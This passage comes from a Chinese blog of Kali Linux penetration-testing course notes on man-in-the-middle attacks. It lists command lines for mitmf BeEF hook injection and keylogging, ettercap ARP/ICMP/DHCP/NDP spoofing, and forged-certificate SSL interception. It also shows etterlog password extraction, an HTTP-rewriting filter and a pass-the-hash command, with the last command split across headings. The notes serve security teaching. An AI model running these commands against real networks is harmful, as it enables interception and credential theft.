<li>pip install .&#x2F;Twisted-15.5.0.tar.bz2</li>
</ul>
<h2 id="中间人攻击-1"><a href="#中间人攻击-1" class="headerlink" title="中间人攻击"></a>中间人攻击</h2><h3 id="启动beef"><a href="#启动beef" class="headerlink" title="启动beef"></a>启动beef</h3><ul>
<li>cd &#x2F;usr&#x2F;share&#x2F;beef-xss&#x2F;</li>
<li>.&#x2F;beef</li>
</ul>
<h3 id="mitmf中间人注入xss脚本"><a href="#mitmf中间人注入xss脚本" class="headerlink" title="mitmf中间人注入xss脚本"></a>mitmf中间人注入xss脚本</h3><ul>
<li>mitmf –spoof –arp-i eth0 –gateway 1.1.1.1 –target 1.1.1.2 –inject<br>  –js-url <a target="_blank" rel="noopener" href="http://1.1.1.3:3000/hook.js">http://1.1.1.3:3000/hook.js</a></li>
<li>mitmf –spoof –arp-i eth0 –gateway 192.168.20.2 –target<br>  192.168.20.1 –jskeylogger</li>
<li>–upsidedownternet、–screen（&#x2F;var&#x2F;log&#x2F;mitmf）</li>
<li>–ferretng（cookie）、–browserprofiler（浏览器及插件信息）</li>
<li>–smbtrap、–smbauth（不演示）</li>
</ul>
<h2 id="中间人攻击-2"><a href="#中间人攻击-2" class="headerlink" title="中间人攻击"></a>中间人攻击</h2><h3 id="–hsts"><a href="#–hsts" class="headerlink" title="–hsts"></a>–hsts</h3><ul>
<li>HTTP Strict Transport Security</li>
<li>防止协议降级、cookie窃取</li>
<li>安全策略通过HTTP响应头”Strict-Transport-Security“实施</li>
<li>限制user-agent、https等</li>
</ul>
<h3 id="–filepwn"><a href="#–filepwn" class="headerlink" title="–filepwn"></a>–filepwn</h3><h5 id="–-凌空插后门"><a href="#–-凌空插后门" class="headerlink" title="– 凌空插后门"></a>– 凌空插后门</h5><h2 id="中间人攻击-3"><a href="#中间人攻击-3" class="headerlink" title="中间人攻击"></a>中间人攻击</h2><h3 id="Ettercap"><a href="#Ettercap" class="headerlink" title="Ettercap"></a>Ettercap</h3><h5 id="–-统一的中间人攻击工具"><a href="#–-统一的中间人攻击工具" class="headerlink" title="– 统一的中间人攻击工具"></a>– 统一的中间人攻击工具</h5><h5 id="–-转发MAC与本机相同，但IP与本机不同的数据包"><a href="#–-转发MAC与本机相同，但IP与本机不同的数据包" class="headerlink" title="– 转发MAC与本机相同，但IP与本机不同的数据包"></a>– 转发MAC与本机相同，但IP与本机不同的数据包</h5><h5 id="–-支持SSH1、SSL中间人攻击"><a href="#–-支持SSH1、SSL中间人攻击" class="headerlink" title="– 支持SSH1、SSL中间人攻击"></a>– 支持SSH1、SSL中间人攻击</h5><h3 id="模块划分"><a href="#模块划分" class="headerlink" title="模块划分"></a>模块划分</h3><ul>
<li>Snifer</li>
<li>MITM</li>
<li>Filter</li>
<li>Log</li>
<li>Plugin</li>
</ul>
<h2 id="中间人攻击-4"><a href="#中间人攻击-4" class="headerlink" title="中间人攻击"></a>中间人攻击</h2><h3 id="Snifer"><a href="#Snifer" class="headerlink" title="Snifer"></a>Snifer</h3><h5 id="–-负责数据包转发"><a href="#–-负责数据包转发" class="headerlink" title="– 负责数据包转发"></a>– 负责数据包转发</h5><ul>
<li>Unified<br>   单网卡情况下独立完成三层包转发<br>   始终禁用内核IP_Forward功能</li>
<li>Bridge<br>   双网卡情况下的一层MITM模式<br>   可作为IPS过滤数据包<br>   不可在网关上使用（透明网桥）</li>
</ul>
<h3 id="MITM"><a href="#MITM" class="headerlink" title="MITM"></a>MITM</h3><ul>
<li>把流量重定向到ettercap主机上</li>
<li>可以使用其他工具实现MITM，ettercap之作嗅探和过滤使用</li>
</ul>
<h2 id="中间人攻击-5"><a href="#中间人攻击-5" class="headerlink" title="中间人攻击"></a>中间人攻击</h2><h3 id="实现MITM的方法"><a href="#实现MITM的方法" class="headerlink" title="实现MITM的方法"></a>实现MITM的方法</h3><h5 id="–-ARP"><a href="#–-ARP" class="headerlink" title="– ARP"></a>– ARP</h5><h5 id="–-ICMP"><a href="#–-ICMP" class="headerlink" title="– ICMP"></a>– ICMP</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> ICMP路由重定向，半双工</span><br></pre></td></tr></table></figure>
<ul>
<li>DHCP<br>   修改网关地址，半双工</li>
<li>Switch Port Stealing<br>   flood目标地址是本机，源地址是受害者的包<br>   适用于ARP静态绑定的环境</li>
<li>NDP<br>   IPv6协议欺骗技术</li>
</ul>
<h2 id="中间人攻击-6"><a href="#中间人攻击-6" class="headerlink" title="中间人攻击"></a>中间人攻击</h2><h3 id="2-4以上内核对ARP地址欺骗的约束"><a href="#2-4以上内核对ARP地址欺骗的约束" class="headerlink" title="2.4以上内核对ARP地址欺骗的约束"></a>2.4以上内核对ARP地址欺骗的约束</h3><h5 id="–-收到非请求的ARP响应包，不更新本地ARP缓存"><a href="#–-收到非请求的ARP响应包，不更新本地ARP缓存" class="headerlink" title="– 收到非请求的ARP响应包，不更新本地ARP缓存"></a>– 收到非请求的ARP响应包，不更新本地ARP缓存</h5><ul>
<li>Ettercap使用ARP request包进行攻击</li>
</ul>
<h3 id="Solaris-不根据ARP包更新本地ARP缓存"><a href="#Solaris-不根据ARP包更新本地ARP缓存" class="headerlink" title="Solaris 不根据ARP包更新本地ARP缓存"></a>Solaris 不根据ARP包更新本地ARP缓存</h3><ul>
<li>Ettercap使用先发ICMP包来更新ARP缓存</li>
</ul>
<h2 id="中间人攻击-7"><a href="#中间人攻击-7" class="headerlink" title="中间人攻击"></a>中间人攻击</h2><h3 id="用户操作界面"><a href="#用户操作界面" class="headerlink" title="用户操作界面"></a>用户操作界面</h3><h5 id="–-T-文本界面"><a href="#–-T-文本界面" class="headerlink" title="– -T 文本界面"></a>– -T 文本界面</h5><h5 id="–-G-图形界面"><a href="#–-G-图形界面" class="headerlink" title="– -G 图形界面"></a>– -G 图形界面</h5><h5 id="–-C-基于文本的图形界面"><a href="#–-C-基于文本的图形界面" class="headerlink" title="– -C 基于文本的图形界面"></a>– -C 基于文本的图形界面</h5><h5 id="–-D-后台模式"><a href="#–-D-后台模式" class="headerlink" title="– -D 后台模式"></a>– -D 后台模式</h5><h3 id="指定目标"><a href="#指定目标" class="headerlink" title="指定目标"></a>指定目标</h3><ul>
<li>IPv4：MAC&#x2F;IPs&#x2F;Ports</li>
<li>IPv6：MAC&#x2F;IPs&#x2F;IPv6&#x2F;Ports</li>
<li>&#x2F;10.0.0.1−5;10.0.1.33&#x2F;20−25,80,110</li>
</ul>
<h2 id="中间人攻击-8"><a href="#中间人攻击-8" class="headerlink" title="中间人攻击"></a>中间人攻击</h2><h3 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h3><ul>
<li>需要root权限打开链路层Socket连接，然后使用nobody账号运行</li>
<li>日志写入目录需要nobody有写入权</li>
<li>修改etter.conf：EC_UID&#x3D;65534</li>
</ul>
<p> 基于伪造证书的SSL MITIM</p>
<ul>
<li>Bridge模式不支持SSL MITM</li>
<li>openssl genrsa −out etter.ssl.crt 1024</li>
<li>openssl req −new−keyetter.ssl.crt −out tmp.csr</li>
<li>openssl x509 −req−days 1825 −in tmp.csr−signkey etter.ssl.crt<br>  −out tmp.new</li>
<li>cat tmp.new&gt;&gt;etter.ssl.crt</li>
<li>rm −f tmp.newtmp.csr</li>
</ul>
<h2 id="ARP-MITM"><a href="#ARP-MITM" class="headerlink" title="ARP MITM"></a>ARP MITM</h2><h3 id="字符模式"><a href="#字符模式" class="headerlink" title="字符模式"></a>字符模式</h3><ul>
<li>ettercap -i eth0 -T -M arp-q &#x2F;192.168.1.1&#x2F;&#x2F; &#x2F;192.168.1.2&#x2F;&#x2F; -F 1.ef -P<br>  autoadd -w a.cap -l loginfo -L logall-m message</li>
</ul>
<h3 id="图形界面"><a href="#图形界面" class="headerlink" title="图形界面"></a>图形界面</h3><h3 id="SSL-MITM"><a href="#SSL-MITM" class="headerlink" title="SSL MITM"></a>SSL MITM</h3><ul>
<li>vi &#x2F;etc&#x2F;ettercap&#x2F;etter.conf</li>
</ul>
<h3 id="DNS欺骗"><a href="#DNS欺骗" class="headerlink" title="DNS欺骗"></a>DNS欺骗</h3><ul>
<li>dns_spoof插件配置文件</li>
<li>vi &#x2F;etc&#x2F;ettercap&#x2F;etter.dns</li>
</ul>
<h2 id="ARP-MITM-1"><a href="#ARP-MITM-1" class="headerlink" title="ARP MITM"></a>ARP MITM</h2><h3 id="Ettercap-日志查看"><a href="#Ettercap-日志查看" class="headerlink" title="Ettercap 日志查看"></a>Ettercap 日志查看</h3><ul>
<li>etterlog -p log.eci 查看获取的密码</li>
<li>etterlog -c log.ecp 列出Log中的连接</li>
<li>etterlog -c -f &#x2F;1.1.1.1&#x2F; log.ecp</li>
<li>etterlog -B -n -s -F TCP:1.1.1.1:20:1.1.1.2:1234 log.ecp&gt; aa<br>  选择相应的连接并榨取文件</li>
</ul>
<h2 id="ARP-MITM-2"><a href="#ARP-MITM-2" class="headerlink" title="ARP MITM"></a>ARP MITM</h2><h3 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h3><ul>
<li>&#x2F;usr&#x2F;share&#x2F;ettercap&#x2F;</li>
</ul>
<h3 id="SSH-2-xx-x2F-SSH-1-99-x2F-SSH-1-51"><a href="#SSH-2-xx-x2F-SSH-1-99-x2F-SSH-1-51" class="headerlink" title="SSH-2.xx &#x2F; SSH-1.99 &#x2F; SSH-1.51"></a>SSH-2.xx &#x2F; SSH-1.99 &#x2F; SSH-1.51</h3><ul>
<li>etterfilter etter.filter.ssh -o ssh.ef</li>
</ul>
<h3 id="替换HTTP内容"><a href="#替换HTTP内容" class="headerlink" title="替换HTTP内容"></a>替换HTTP内容</h3><ul>
<li>if (ip.proto &#x3D;&#x3D; TCP &amp;&amp; tcp.src &#x3D;&#x3D; 80) {</li>
<li>msg(“data on TCP 80\n”);</li>
<li>replace(“img src&#x3D;”, “imgsrc&#x3D;&quot;<a target="_blank" rel="noopener" href="http://1.1.1.1/1.gif/&quot;">http://1.1.1.1/1.gif\&quot;</a> “);</li>
<li>replace(“IMG src&#x3D;”, “img src&#x3D;&quot;<a target="_blank" rel="noopener" href="http://1.1.1.1/1.gif/&quot;">http://1.1.1.1/1.gif\&quot;</a> “);</li>
<li>replace(“IMG SRC&#x3D;”, “img src&#x3D;&quot;<a target="_blank" rel="noopener" href="http://1.1.1.1/1.gif/&quot;">http://1.1.1.1/1.gif\&quot;</a> “);</li>
<li>}</li>
</ul>
<h2 id="中间人攻击-9"><a href="#中间人攻击-9" class="headerlink" title="中间人攻击"></a>中间人攻击</h2><h3 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h3><ul>
<li>-M icmp:00:11:22:33:44:55&#x2F;10.0.0.1（真实网关的MAC&#x2F;IP）</li>
</ul>
<h3 id="DHCP"><a href="#DHCP" class="headerlink" title="DHCP"></a>DHCP</h3><ul>
<li>−M dhcp:192.168.0.30,35,50−60&#x2F;255.255.255.0&#x2F;192.168.0.1（DNS）</li>
</ul>
<h3 id="Port"><a href="#Port" class="headerlink" title="Port"></a>Port</h3><ul>
<li>-M port &#x2F;1.1.1.1&#x2F; &#x2F;1.1.1.2&#x2F;</li>
</ul>
<h3 id="Ndp"><a href="#Ndp" class="headerlink" title="Ndp"></a>Ndp</h3><ul>
<li>-M ndp &#x2F;&#x2F;fe80::260d:afff:fe6e:f378&#x2F; &#x2F;&#x2F;2001:db8::2:1&#x2F;</li>
</ul>
<h2 id="Pass-the-Hash-PTH"><a href="#Pass-the-Hash-PTH" class="headerlink" title="Pass the Hash (PTH)"></a>Pass the Hash (PTH)</h2><h3 id="密码破解耗费时间资源巨大"><a href="#密码破解耗费时间资源巨大" class="headerlink" title="密码破解耗费时间资源巨大"></a>密码破解耗费时间资源巨大</h3><h3 id="使用密文提交给服务器直接完成身份认证"><a href="#使用密文提交给服务器直接完成身份认证" class="headerlink" title="使用密文提交给服务器直接完成身份认证"></a>使用密文提交给服务器直接完成身份认证</h3><h3 id="NTLM-x2F-LM是没有加盐的静态HASH密文"><a href="#NTLM-x2F-LM是没有加盐的静态HASH密文" class="headerlink" title="NTLM&#x2F;LM是没有加盐的静态HASH密文"></a>NTLM&#x2F;LM是没有加盐的静态HASH密文</h3><h3 id="企业中使用ghost等工具克隆安装系统"><a href="#企业中使用ghost等工具克隆安装系统" class="headerlink" title="企业中使用ghost等工具克隆安装系统"></a>企业中使用ghost等工具克隆安装系统</h3><h3 id="pth-winexe-U"><a href="#pth-winexe-U" class="headerlink" title="pth-winexe -U"></a>pth-winexe -U</h3><h3 id="w7-aad3b435b51404eeaad3b435b51404ee-ed1bfaeb3063"><a href="#w7-aad3b435b51404eeaad3b435b51404ee-ed1bfaeb3063" class="headerlink" title="w7%aad3b435b51404eeaad3b435b51404ee:ed1bfaeb3063"></a>w7%aad3b435b51404eeaad3b435b51404ee:ed1bfaeb3063</h3><h3 id="716ab7fe2a11faf126d8-x2F-x2F-1-1-1-1-cmd"><a href="#716ab7fe2a11faf126d8-x2F-x2F-1-1-1-1-cmd" class="headerlink" title="716ab7fe2a11faf126d8 &#x2F;&#x2F;1.1.1.1 cmd"></a>716ab7fe2a11faf126d8 &#x2F;&#x2F;1.1.1.1 cmd</h3></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">张学松</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://zhangxuesong123.github.io/2022/04/07/%E5%AE%89%E5%85%A8%E7%89%9B%E6%95%B4%E7%90%86%E7%AC%94%E8%AE%B0/">https://zhangxuesong123.github.io/2022/04/07/%E5%AE%89%E5%85%A8%E7%89%9B%E6%95%B4%E7%90%86%E7%AC%94%E8%AE%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://zhangxuesong123.github.io" target="_blank">学松的小毛驴</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><a class="post-meta__tags" href="/tags/%E7%AC%94%E8%AE%B0/">笔记</a><a class="post-meta__tags" href="/tags/kali/">kali</a></div><div class="post_share"><div class="social-share" data-image="https://img-blog.csdnimg.cn/20200822171906778.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3ZhbmFycm93,size_16,color_FFFFFF,t_70#pic_center" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/04/07/%E9%9D%A2%E8%AF%95%E5%BF%85%E8%81%8A%E4%B9%8BPOM%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/"><img class="prev-cover" src="https://pic2.zhimg.com/3708cb76ff8597fa6532a1ac9c924b2d_r.jpg?source=1940ef5c" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">面试必聊之POM测试框架</div></div></a></div><div class="next-post pull-right"><a href="/2022/04/06/Pytest%E6%8E%A5%E5%8F%A3%E8%87%AA%E5%8A%A8%E5%8C%96%E8%BF%9B%E9%98%B6%E5%AE%9E%E6%88%98/"><img class="next-cover" src="https://cms.liara.ir/wp-content/uploads/2020/07/pytest.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Pytest接口自动化进阶实战</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/06/10/Nessus-%E5%AE%89%E8%A3%85%E7%A0%B4%E8%A7%A3/" title="Nessus 安装破解"><img class="cover" src="https://pic3.zhimg.com/v2-fbb002ec83393f1b87a55cfb69c864db_r.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-06-10</div><div class="title">Nessus 安装破解</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://img.xintp.com/c2022/03/10/tw4v0hz1seh.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">张学松</div><div class="author-info__description"></div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">18</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/zhangxuesong123/zhangxuesong123.github.io"><i class="fab fa-github"></i><span>我的hub</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">枯燥且乏味的博客</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%AB%A0-%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">第一章 介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Kali-linux%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="toc-number">1.1.</span> <span class="toc-text">Kali linux渗透测试</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E7%9A%84%E6%A0%B9%E6%BA%90"><span class="toc-number">1.1.0.1.</span> <span class="toc-text">安全问题的根源</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E7%9B%AE%E6%A0%87"><span class="toc-number">1.1.0.2.</span> <span class="toc-text">安全目标</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E5%85%88%E4%BA%8E%E6%94%BB%E5%87%BB%E8%80%85%E5%8F%91%E7%8E%B0%E5%92%8C%E9%98%B2%E2%BD%8C%E6%AD%A2%E6%BC%8F%E6%B4%9E%E5%87%BA%E7%8E%B0"><span class="toc-number">1.1.0.2.1.</span> <span class="toc-text">• 先于攻击者发现和防⽌止漏洞出现</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="toc-number">1.1.0.3.</span> <span class="toc-text">渗透测试</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E5%B0%9D%E8%AF%95%E6%8C%AB%E8%B4%A5%E5%AE%89%E5%85%A8%E9%98%B2%E5%BE%A1%E6%9C%BA%E5%88%B6%EF%BC%8C%E5%8F%91%E7%8E%B0%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E5%BC%B1%E7%82%B9%EF%BC%9B"><span class="toc-number">1.1.0.3.1.</span> <span class="toc-text">• 尝试挫败安全防御机制，发现系统安全弱点；</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E4%BB%8E%E6%94%BB%E5%87%BB%E8%80%85%E7%9A%84%E2%BE%93%E8%A7%92%E5%BA%A6%E6%80%9D%E8%80%83%EF%BC%8C%E6%B5%8B%E9%87%8F%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E6%9C%89%E6%95%88%E6%80%A7%EF%BC%9B"><span class="toc-number">1.1.0.3.2.</span> <span class="toc-text">• 从攻击者的⾓角度思考，测量安全防护有效性；</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%80%A2-%E8%AF%81%E6%98%8E%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E7%9A%84%E5%AD%98%E5%9C%A8%EF%BC%8C%E2%BD%BD%E8%80%8C%E2%BE%AE%E9%9D%9E%E7%A0%B4%E5%9D%8F%EF%BC%9B"><span class="toc-number">1.1.0.3.3.</span> <span class="toc-text">• 证明安全问题的存在，⽽而⾮非破坏；</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%A0%87%E5%87%86"><span class="toc-number">1.1.0.4.</span> <span class="toc-text">渗透测试标准</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E9%A1%B9%E7%9B%AE"><span class="toc-number">1.1.0.5.</span> <span class="toc-text">渗透测试项目</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%AF%AF%E5%8C%BA"><span class="toc-number">1.1.0.6.</span> <span class="toc-text">渗透测试误区</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#KALI"><span class="toc-number">1.1.0.7.</span> <span class="toc-text">KALI</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#KALI-LINUX-%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.0.8.</span> <span class="toc-text">KALI LINUX 介绍</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#KALI-LINUX-%E7%AD%96%E7%95%A5"><span class="toc-number">1.1.0.9.</span> <span class="toc-text">KALI LINUX 策略</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E4%BA%8E%E6%9C%AC%E6%95%99%E7%A8%8B"><span class="toc-number">1.1.0.10.</span> <span class="toc-text">关于本教程</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E5%AE%89%E8%A3%85"><span class="toc-number">2.</span> <span class="toc-text">第二章 安装</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A1%AC%E7%9B%98%E5%AE%89%E8%A3%85"><span class="toc-number">2.1.</span> <span class="toc-text">硬盘安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8C%81%E4%B9%85%E5%8A%A0%E5%AF%86-USB-%E5%AE%89%E8%A3%85-1"><span class="toc-number">2.2.</span> <span class="toc-text">持久加密 USB 安装 -1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8C%81%E4%B9%85%E5%8A%A0%E5%AF%86-USB-%E5%AE%89%E8%A3%85-2"><span class="toc-number">2.3.</span> <span class="toc-text">持久加密 USB 安装 -2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AE%89%E8%A3%85"><span class="toc-number">2.4.</span> <span class="toc-text">虚拟机安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%86%9F%E6%82%89%E7%8E%AF%E5%A2%83"><span class="toc-number">2.5.</span> <span class="toc-text">熟悉环境</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%80%A2-%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81"><span class="toc-number">2.5.1.</span> <span class="toc-text">• 登陆密码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%86%9F%E6%82%89-BASH-%E5%91%BD%E4%BB%A4"><span class="toc-number">2.6.</span> <span class="toc-text">熟悉 BASH 命令</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Q-amp-A"><span class="toc-number">3.</span> <span class="toc-text">Q &amp; A</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E7%AB%A0-%E5%AE%9A%E5%88%B6"><span class="toc-number">4.</span> <span class="toc-text">第三章 定制</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE-1"><span class="toc-number">4.1.</span> <span class="toc-text">网络配置 -1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE-2"><span class="toc-number">4.2.</span> <span class="toc-text">网络配置 -2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%80%A2-%E5%9B%BA%E5%AE%9AIP%E5%9C%B0%E5%9D%80"><span class="toc-number">4.3.</span> <span class="toc-text">• 固定IP地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9B%B4%E6%96%B0%E5%8D%87%E7%BA%A7"><span class="toc-number">4.4.</span> <span class="toc-text">更新升级</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E8%A3%85%E8%BD%AF%E4%BB%B6%E5%8C%85"><span class="toc-number">4.5.</span> <span class="toc-text">安装软件包</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E6%8F%92%E4%BB%B6"><span class="toc-number">4.6.</span> <span class="toc-text">浏览器插件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%80%A2-%E5%AE%89%E8%A3%85JAVA"><span class="toc-number">4.7.</span> <span class="toc-text">• 安装JAVA-</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%80%A2-%E5%AE%89%E8%A3%85JAVA-1"><span class="toc-number">4.8.</span> <span class="toc-text">• 安装JAVA-</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E8%A3%85%E6%98%BE%E5%8D%A1%E9%A9%B1%E5%8A%A8"><span class="toc-number">4.9.</span> <span class="toc-text">安装显卡驱动</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1%E8%A1%A5%E4%B8%81"><span class="toc-number">4.10.</span> <span class="toc-text">无线网卡补丁</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B9%B6%E5%8F%91%E7%BA%BF%E7%A8%8B%E9%99%90%E5%88%B6"><span class="toc-number">4.11.</span> <span class="toc-text">并发线程限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%B5%E6%BA%90%E4%BC%98%E5%8C%96"><span class="toc-number">4.12.</span> <span class="toc-text">电源优化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%94%E8%AE%B0%E6%9C%AC%E6%A8%A1%E5%BC%8F"><span class="toc-number">4.13.</span> <span class="toc-text">笔记本模式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%BC%80%E5%85%B3"><span class="toc-number">4.14.</span> <span class="toc-text">服务开关</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BF%BB%E5%A2%99-amp-%E4%BB%A3%E7%90%86"><span class="toc-number">4.15.</span> <span class="toc-text">翻墙 &amp; 代理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%80%A2-GOAGENT"><span class="toc-number">4.16.</span> <span class="toc-text">• GOAGENT</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%80%A2-GOAGENT%E5%AE%89%E8%A3%85"><span class="toc-number">4.17.</span> <span class="toc-text">• GOAGENT安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%90%86%E9%93%BE"><span class="toc-number">4.18.</span> <span class="toc-text">代理链</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#proxychains-iceweasel"><span class="toc-number">5.</span> <span class="toc-text">proxychains iceweasel</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%90%86%E8%AE%BE%E7%BD%AE"><span class="toc-number">5.1.</span> <span class="toc-text">代理设置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TOR"><span class="toc-number">5.2.</span> <span class="toc-text">TOR</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TOR-1"><span class="toc-number">5.3.</span> <span class="toc-text">TOR</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Q-amp-A-1"><span class="toc-number">6.</span> <span class="toc-text">Q &amp; A</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="toc-number">7.</span> <span class="toc-text">第四章 实验环境</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%86%E5%A4%87%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="toc-number">7.0.0.1.</span> <span class="toc-text">准备实验环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%89%E8%A3%85%E8%99%9A%E6%8B%9F%E6%9C%BA"><span class="toc-number">7.0.0.2.</span> <span class="toc-text">安装虚拟机</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" 